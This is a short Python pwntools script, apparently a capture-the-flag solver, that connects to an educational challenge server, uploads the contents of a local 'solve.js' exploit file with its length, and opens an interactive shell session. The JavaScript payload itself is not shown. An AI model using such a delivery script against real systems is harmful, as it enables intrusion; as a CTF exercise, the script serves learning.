from pwn import *

r = remote("edu-ctf.zoolab.org",30219)

with open('solve.js','r') as f:
    context = f.read()
    r.sendlineafter(b"len>",str(len(context)))
    r.sendline(context.encode())

r.interactive()
